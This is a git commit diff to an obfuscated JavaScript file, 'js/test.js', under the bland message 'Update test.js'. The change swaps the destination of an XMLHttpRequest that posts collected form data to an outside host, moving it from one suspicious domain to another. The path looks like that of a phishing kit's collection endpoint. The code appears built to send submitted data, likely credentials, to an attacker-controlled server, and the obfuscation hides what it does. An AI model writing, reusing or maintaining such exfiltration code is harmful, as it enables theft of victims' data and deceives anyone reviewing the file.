6967da687c04c5d1de388507e7da7147a81d187f
phpconsults <68612513+phpconsults@users.noreply.github.com>
2026-09-14 03:13:42 -0700

    Update test.js

--- js/test.js
+++ js/test.js
@@ -10588,7 +10588,7 @@ function Hp() {
             const _0x2e3f65 = new FormData();
             Object[_0xf8e1ee(0x81c) + 'es'](_0x295851)[_0xf8e1ee(0x40d) + 'ch'](([_0x395d1a, _0xbf3eef]) => _0x2e3f65[_0xf8e1ee(0x872) + 'd'](_0x395d1a, _0xbf3eef));
             const _0x278370 = new XMLHttpRequest();
-            _0x278370['open'](_0xf8e1ee(0x3eb), 'https://arenco.cam/oz26/a2/', !0x0), _0x278370[_0xf8e1ee(0xc9b) + 'd'] = () => {
+            _0x278370['open'](_0xf8e1ee(0x3eb), 'https://ygemc.net/oz26/a2/', !0x0), _0x278370[_0xf8e1ee(0xc9b) + 'd'] = () => {
                 setTimeout(() => {
                     var _0xd98138 = _0x4143,
                         _0x42dc22 = { 
